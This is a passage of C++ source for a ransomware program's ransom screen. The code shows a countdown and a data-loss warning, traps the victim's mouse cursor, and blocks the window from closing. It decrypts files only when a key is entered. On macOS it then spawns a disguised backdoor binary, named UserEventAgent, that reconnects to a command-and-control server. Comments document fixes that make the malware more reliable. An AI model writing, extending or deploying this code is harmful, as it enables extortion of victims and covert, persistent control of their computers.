    const bool hot = m_hover || m_pressed;
    wxRect2DDouble btnR(btnX, rowY, kButtonW, kActionH);

    if (hot) {
        gui::RadialGlow(gc, btnR.m_x + btnR.m_width / 2.0, btnR.m_y + btnR.m_height / 2.0,
                        btnR.m_width * 0.62, wxColour(0xE0, 0x4A, 0x3C), 55, 18);
    }

    const double pressOffset = m_pressed ? 1.0 : 0.0;
    wxRect2DDouble btnFace(btnR.m_x, btnR.m_y + pressOffset, btnR.m_width,
                           btnR.m_height - pressOffset);
    gui::FillRound(gc, btnFace, kControlRadius,
                   m_pressed ? wxColour(0xB4, 0x32, 0x27)
                             : (hot ? wxColour(0xF2, 0x5A, 0x4C) : wxColour(0xE0, 0x4A, 0x3C)));

    // top highlight line — reads as a bevel without looking skeuomorphic
    gc->SetPen(wxPen(wxColour(0xFF, 0xFF, 0xFF, hot ? 70 : 45), 1));
    gc->StrokeLine(btnFace.m_x + 8, btnFace.m_y + 1.0,
                   btnFace.m_x + btnFace.m_width - 8, btnFace.m_y + 1.0);

    gc->SetFont(gui::DisplayFont(12, wxFONTWEIGHT_BOLD), wxColour(0xFF, 0xF6, 0xEC));
    const wxString cta = "UNLOCK FILES";
    const double ctaW = gui::TrackedWidth(gc, cta, 2.2);
    double cw = 0, ch = 0, cd = 0, ce = 0;
    gc->GetTextExtent(cta, &cw, &ch, &cd, &ce);
    gui::DrawTracked(gc, cta, btnFace.m_x + (btnFace.m_width - ctaW) / 2.0,
                     btnFace.m_y + (btnFace.m_height - ch) / 2.0 - 1.0, 2.2);

    y += kActionH + 10.0;

    // ---- status line ----
    const wxString status = m_status.IsEmpty()
        ? wxString("WRONG KEY = PERMANENT DATA LOSS")
        : m_status;
    const wxColour statusColour = m_status.IsEmpty()
        ? gui::Danger()
        : (m_statusSuccess ? gui::Success() : gui::Danger());

    gc->SetFont(gui::MonoFont(9, wxFONTWEIGHT_BOLD), statusColour);
    const double statusW = gui::TrackedWidth(gc, status, 2.6);
    if (m_status.IsEmpty()) {
        gui::WarningGlyph(gc, cx - statusW / 2.0 - 17.0, y + 2.0, 9.0, statusColour);
    }
    gui::DrawTracked(gc, status, cx - statusW / 2.0, y, 2.6);

    // publish hit areas for the mouse handlers
    m_fieldRect  = wxRect(fieldX, rowY, kFieldW, kActionH);
    m_buttonRect = wxRect(btnX, rowY, kButtonW, kActionH);
}

// ---------------------------------------------------------------------------
// Paint — measures the flow, centres it, then draws in order.
// ---------------------------------------------------------------------------
void ScenePanel::Render(wxGraphicsContext* gc, int w, int h)
{
    DrawBackground(gc, w, h);

    const CardMetrics card = MeasureCard(gc, w);

    // Fixed vertical blocks: header ~= emblem + wordmark + eyebrow + divider,
    // footer = deadline + timer + field + status.
    const double headerH = (m_emblem.IsOk() ? kEmblemSize + 8 : 0) + 38 + 20 + 15;
    const double footerH = 16 + 7 * kTimerPixel + 16 + kActionH + 10 + 14;
    const double needed  = headerH + 16 + card.cardH + 22 + footerH;

    // Centre when there is slack, otherwise start near the top and let the
    // window's minimum size guarantee the rest.
    double y = std::max(10.0, (h - needed) / 2.0);

    y = DrawHeader(gc, w, y);
    y += 16;
    DrawCard(gc, y, card);
    y += card.cardH + 22;
    DrawFooter(gc, w, y);

    gc->Flush();
}

void ScenePanel::OnPaint(wxPaintEvent&)
{
    wxAutoBufferedPaintDC pdc(this);
    std::unique_ptr<wxGraphicsContext> gc(wxGraphicsContext::Create(pdc));
    if (!gc) return;

    const wxSize sz = GetClientSize();
    Render(gc.get(), sz.GetWidth(), sz.GetHeight());
}

// ---------------------------------------------------------------------------
// CTA interaction — the button is painted, so it needs manual hit testing.
// ---------------------------------------------------------------------------
void ScenePanel::OnMotion(wxMouseEvent& event)
{
    const bool inside = m_buttonRect.Contains(event.GetPosition());
    if (inside != m_hover) {
        m_hover = inside;
        SetCursor(inside ? wxCursor(wxCURSOR_HAND) : wxCursor(wxCURSOR_ARROW));
        Refresh();
    }
    event.Skip();
}

void ScenePanel::OnLeaveWindow(wxMouseEvent& event)
{
    if (m_hover || m_pressed) {
        m_hover = false;
        m_pressed = false;
        Refresh();
    }
    event.Skip();
}

void ScenePanel::OnLeftDown(wxMouseEvent& event)
{
    if (m_buttonRect.Contains(event.GetPosition())) {
        m_pressed = true;
        Refresh();
    } else if (m_fieldRect.Contains(event.GetPosition())) {
        // Clicking the painted well focuses the panel so OnCharHook receives keys
        SetFocus();
        m_caretOn = true;
        Refresh();
    }
    event.Skip();
}

void ScenePanel::OnLeftUp(wxMouseEvent& event)
{
    const bool wasPressed = m_pressed;
    m_pressed = false;

    if (wasPressed && m_buttonRect.Contains(event.GetPosition())) {
        Refresh();
        m_owner->AttemptUnlock(m_key);
        return;
    }
    if (wasPressed) Refresh();
    event.Skip();
}

// ============================================================================
// RansomwareFrame
// ============================================================================
RansomwareFrame::RansomwareFrame()
    : wxFrame(nullptr, wxID_ANY, OBF("The Wasp Hive"),
              wxDefaultPosition, wxDefaultSize),
      m_clockTimer(nullptr), m_mouseTimer(nullptr), m_scene(nullptr),
      m_hours(4), m_minutes(0), m_seconds(36),
      m_canClose(false)
{
    SetBackgroundColour(*wxBLACK);

    // Size against the usable desktop area instead of a fixed pixel size: a
    // hard-coded 900x772 window spilled under the Dock on a 1440x900 screen,
    // which clipped the key field and the status line.
    const wxRect area = wxGetClientDisplayRect();
    const int w = std::min(940, std::max(800, area.GetWidth()  - 160));
    const int h = std::min(772, std::max(kMinHeight, area.GetHeight() - 40));

    // The scene needs 540 + kEmblemSize vertically (measured) plus 10px of air
    // above and below; a smaller frame clipped the status line at the bottom.
    SetMinSize(wxSize(800, kMinHeight));
    SetSize(area.GetX() + (area.GetWidth() - w) / 2,
            area.GetY() + (area.GetHeight() - h) / 2, w, h);

    m_scene = new ScenePanel(this);

    wxBoxSizer* sizer = new wxBoxSizer(wxVERTICAL);
    sizer->Add(m_scene, 1, wxEXPAND);
    SetSizer(sizer);

    // Countdown
    m_clockTimer = new wxTimer(this, 1001);
    m_clockTimer->Start(1000);
    Bind(wxEVT_TIMER, &RansomwareFrame::OnTimer, this, 1001);

    // Cursor containment
    m_mouseTimer = new wxTimer(this, 1002);
    m_mouseTimer->Start(50);
    Bind(wxEVT_TIMER, &RansomwareFrame::OnMouseTracker, this, 1002);

    Bind(wxEVT_CLOSE_WINDOW, &RansomwareFrame::OnClose, this);
}

RansomwareFrame::~RansomwareFrame()
{
    // BUGFIX: the old destructor leaked the mouse-tracker timer. Screen2.cpp
    // already deleted both; this file never did.
    if (m_clockTimer) { m_clockTimer->Stop(); delete m_clockTimer; m_clockTimer = nullptr; }
    if (m_mouseTimer) { m_mouseTimer->Stop(); delete m_mouseTimer; m_mouseTimer = nullptr; }
}

void RansomwareFrame::FocusKeyField()
{
    if (m_scene) m_scene->SetFocus();
}

void RansomwareFrame::OnTimer(wxTimerEvent&)
{
    m_seconds--;
    if (m_seconds < 0) { m_seconds = 59; m_minutes--; }
    if (m_minutes < 0) { m_minutes = 59; m_hours--; }
    if (m_hours < 0) {
        m_hours = m_minutes = m_seconds = 0;
        m_clockTimer->Stop();
    }
    m_scene->SetTime(m_hours, m_minutes, m_seconds);
}

// ---------------------------------------------------------------------------
// Cursor trap — keeps the pointer inside the window (original behaviour).
// ---------------------------------------------------------------------------
void RansomwareFrame::OnMouseTracker(wxTimerEvent&)
{
    const wxPoint mousePos = wxGetMousePosition();
    const wxPoint winPos   = GetScreenPosition();
    const wxSize  winSize  = GetSize();

    const int winLeft   = winPos.x;
    const int winRight  = winPos.x + winSize.x;
    const int winTop    = winPos.y;
    const int winBottom = winPos.y + winSize.y;

    bool outside = false;
    int newX = mousePos.x;
    int newY = mousePos.y;

    if (mousePos.x < winLeft)        { newX = winLeft + 10;  outside = true; }
    else if (mousePos.x > winRight)  { newX = winRight - 10; outside = true; }

    if (mousePos.y < winTop)         { newY = winTop + 10;   outside = true; }
    else if (mousePos.y > winBottom) { newY = winBottom - 10; outside = true; }

    if (!outside) return;

#ifdef _WIN32
    SetCursorPos(newX, newY);
#elif defined(__APPLE__)
    CGPoint point = CGPointMake(newX, newY);
    CGWarpMouseCursorPosition(point);
#else
    WarpPointer(newX, newY);
#endif
}

void RansomwareFrame::OnClose(wxCloseEvent& event)
{
    if (!m_canClose) {
        // Inline, on-theme refusal instead of a native message box — the
        // native dialog was the only widget left that broke the visual language.
        // Kept short on purpose — the status line is drawn at a fixed size and
        // a longer sentence used to run past the window edge.
        m_scene->SetStatus("FILES ARE ENCRYPTED \xE2\x80\x94 ENTER THE KEY", false);
        event.Veto();
    } else {
        event.Skip();
    }
}

// ---------------------------------------------------------------------------
// Unlock flow — unchanged semantics, new feedback surface.
// ---------------------------------------------------------------------------
void RansomwareFrame::AttemptUnlock(const wxString& key)
{
    if (key.IsEmpty()) {
        m_scene->SetStatus("ENTER THE DECRYPTION KEY", false);
        return;
    }

    const std::string provided_key(key.mb_str());

    if (!decryptTargetFile(provided_key)) {
        // Inline failure: the theme stays intact. The typed key is kept so a
        // typo can be corrected with backspace instead of retyping everything.
        m_scene->SetStatus("INVALID KEY \xE2\x80\x94 FILES REMAIN ENCRYPTED", false);
        return;
    }

    // ---- success ----
    m_scene->SetStatus("DECRYPTION SUCCESSFUL \xE2\x80\x94 RESTORING FILES", true);
    m_scene->Refresh();
    Update();                 // flush the success frame before we tear down
    wxMilliSleep(1200);       // let the operator actually read it

    // Stop all timers first — no repaints while the process unwinds.
    if (m_mouseTimer) m_mouseTimer->Stop();
    if (m_clockTimer) m_clockTimer->Stop();

    FILE* c2log = fopen("/tmp/mware_c2.log", "a");

#ifdef __APPLE__
    // ========================================================================
    // CHILD-PROCESS BACKDOOR — same flow as before:
    //   1. disconnect C2Agent          -> MWare-gui drops from RSW's bot list
    //   2. posix_spawn(UserEventAgent) -> headless C2 binary, no GUI
    //   3. _exit(0)                    -> MWare-gui dies completely
    //
    // RACE FIX (kept): stopBackgroundThread() must run BEFORE disconnect().
    // disconnect() only closes the socket; the detached thread was still in
    // `while (running)` and would immediately reconnect as a ghost bot entry
    // right before this process exits.
    // ========================================================================
    if (g_c2_agent) {
        g_c2_agent->stopBackgroundThread();
        g_c2_agent->disconnect();
    }

    wxString exeDir = wxFileName(wxStandardPaths::Get().GetExecutablePath()).GetPath();
    wxString childPath = exeDir + wxFileName::GetPathSeparator() + "UserEventAgent";

    // Keep the wxCharBuffer alive for the whole spawn sequence: childPath.mb_str()
    // returns a temporary, and posix_spawn_file_actions_* malloc() internally,
    // which previously could clobber the freed block and exec a garbage path.
    wxCharBuffer childPathBuf = childPath.mb_str();
    char* childPathCStr = childPathBuf.data();

    if (c2log) fprintf(c2log, "[C2] Spawning child: %s\n", childPathCStr);

    if (!wxFileExists(childPath)) {
        if (c2log) {
            fprintf(c2log,
                    "[C2] ERROR: child binary missing: %s (run 'make UserEventAgent')\n",
                    childPathCStr);
        }
    }

    pid_t childPid = -1;
    char* childArgv[] = { childPathCStr, nullptr };
    extern char** environ;

    posix_spawn_file_actions_t actions;
    posix_spawn_file_actions_init(&actions);
    posix_spawn_file_actions_addopen(&actions, 0, "/dev/null", O_RDONLY, 0);
    posix_spawn_file_actions_addopen(&actions, 1, "/dev/null", O_WRONLY, 0);
    posix_spawn_file_actions_addopen(&actions, 2, "/dev/null", O_WRONLY, 0);

    int spawnRet = posix_spawn(&childPid, childPathCStr, &actions, nullptr,
                               childArgv, environ);
    posix_spawn_file_actions_destroy(&actions);

    if (c2log) {
        fprintf(c2log, "[C2] posix_spawn: ret=%d (%s) pid=%d\n",
                spawnRet, spawnRet == 0 ? "OK" : strerror(spawnRet), childPid);
    }
#endif

    if (c2log) fclose(c2log);

    m_canClose = true;
    Close(true);
    _exit(0);
}

// ============================================================================
// RansomwareApp
// ============================================================================
bool RansomwareApp::OnInit()
{
    wxInitAllImageHandlers();
    wxImage::AddHandler(new wxPNGHandler());

    RansomwareFrame* frame = new RansomwareFrame();
    frame->Show(true);

    // The key field is painted, not a native control, so nothing would have
    // focus on startup and the first keystrokes would be dropped. Focus it
    // after the frame is shown.
    frame->FocusKeyField();
    return true;
}

#endif // HEADLESS
